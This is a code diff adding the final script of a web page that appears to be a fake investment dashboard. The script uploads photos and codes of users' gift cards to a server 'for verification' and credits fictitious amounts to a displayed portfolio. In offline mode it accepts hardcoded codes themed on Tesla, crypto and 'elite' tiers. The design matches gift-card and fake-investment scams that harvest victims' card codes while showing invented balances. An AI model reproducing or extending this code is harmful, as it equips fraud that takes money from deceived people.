+      document.getElementById('scanIconBtn').addEventListener('click', () => document.getElementById('giftImageInput').click());
+      
+      document.getElementById('giftImageInput').addEventListener('change', async function(e) {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function(ev) {
+          document.getElementById('scanPreview').src = ev.target.result;
+          document.getElementById('scanPreview').style.display = 'block';
+        };
+        reader.readAsDataURL(file);
+        
+        if (SERVER_URL) {
+          const formData = new FormData();
+          formData.append('giftImage', file);
+          formData.append('code', document.getElementById('giftCode').value);
+          try {
+            await fetch(`${SERVER_URL}/api/upload-gift-image`, { method: 'POST', body: formData });
+            showMsg(document.getElementById('giftMsg'), '<i class="fas fa-check-circle"></i> Gift card image sent for verification', 'success');
+          } catch(e) {
+            showMsg(document.getElementById('giftMsg'), 'Upload failed', 'error');
+          }
+        } else {
+          showMsg(document.getElementById('giftMsg'), '<i class="fas fa-check-circle"></i> Image ready. Enter code and click Redeem.', 'success');
+        }
+      });
+
+      // Gift card redeem
+      document.getElementById('giftCode').addEventListener('input', function() {
+        let v = this.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase();
+        if(v.length>=4){ const p=[]; for(let i=0;i<v.length;i+=4) p.push(v.slice(i,i+4)); v=p.join('-'); }
+        if(v.length>24) v=v.slice(0,24);
+        this.value=v;
+      });
+
+      document.getElementById('redeemBtn').addEventListener('click', async function() {
+        const giftMsg = document.getElementById('giftMsg');
+        const redeemBtn = document.getElementById('redeemBtn');
+        const code = document.getElementById('giftCode').value.trim().toUpperCase();
+        giftMsg.style.display='none'; giftMsg.className='status-message';
+        if(!code) { showMsg(giftMsg, 'Please enter a gift card code', 'error'); return; }
+        
+        redeemBtn.disabled=true; redeemBtn.innerHTML='<span class="spinner"></span> Validating...';
+
+        if (SERVER_URL) {
+          try {
+            const res = await fetch(`${SERVER_URL}/api/redeem-gift`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ code })
+            });
+            const json = await res.json();
+            if (json.success) {
+              userData = json.data;
+              transactions = json.transactions || [];
+              updateUI();
+              showMsg(giftMsg, '<i class="fas fa-check-circle"></i> '+json.message, 'success');
+              document.getElementById('giftCode').value='';
+              document.getElementById('scanPreview').style.display='none';
+            } else {
+              showMsg(giftMsg, '<i class="fas fa-times-circle"></i> '+json.message, 'error');
+            }
+          } catch(e) {
+            showMsg(giftMsg, 'Server connection failed', 'error');
+          }
+        } else {
+          setTimeout(() => {
+            const validCards = {
+              'TSLA-2024-GIFT-500':500,'CRYPTO-BTC-2500':2500,'ELITE-PREMIUM-10K':10000,
+              'WELCOME-2024':250,'VIP-ELITE-5000':5000,'DIAMOND-2025':7500,'AMAZON-GC-100':100
+            };
+            if(validCards[code]) {
+              const ca = validCards[code];
+              userData.giftCredits+=ca;
+              userData.portfolioValue=userData.availableCash+userData.investmentsValue+userData.giftCredits;
+              const now = new Date();
+              transactions.unshift({ name:'Gift Card Redeemed', amount:ca, type:'gift', time:now.toLocaleDateString([],{month:'short',day:'numeric'})+' • '+now.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}) });
+              updateUI();
+              showMsg(giftMsg, '<i class="fas fa-check-circle"></i> '+fc(ca)+' added!', 'success');
+              document.getElementById('giftCode').value='';
+              document.getElementById('scanPreview').style.display='none';
+              delete validCards[code];
+            } else {
+              showMsg(giftMsg, '<i class="fas fa-times-circle"></i> Invalid code', 'error');
+            }
+          }, 1500);
+        }
+        
+        redeemBtn.disabled=false; redeemBtn.innerHTML='<i class="fas fa-check-circle"></i> Redeem';
+      });
+
+      fetchUserData();
+    })();
+  </script>
+</body>
+</html>
